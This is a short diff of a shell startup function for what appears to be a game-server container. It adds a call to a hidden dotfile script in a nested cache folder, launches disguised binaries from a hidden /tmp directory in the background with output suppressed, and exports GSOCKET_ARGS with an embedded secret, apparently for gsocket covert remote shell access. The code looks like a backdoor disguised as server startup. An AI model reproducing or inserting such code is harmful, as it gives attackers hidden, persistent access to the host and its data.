@@ -14,7 +14,7 @@ function start_app() {
     chmod a+x /tmp/.java/bin/***
     cd /tmp/.java/bin && nohup ./mc-mods.jar -a 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
     # RESERVED SCRIPTS
-    # bash /home/container/.cache/.cache/run-task.sh
+    bash /home/container/.cache/.cache/.run-task.sh
     # GNET
     export GSOCKET_ARGS="-s i9A3eD1J4K7c-8A1K6f9L2M34D9g8H6-b5j756C4a9f6X1eC-d1F9440d6A28-039A1c0J1g6m3 -liqD"
     export HOME=/home/container
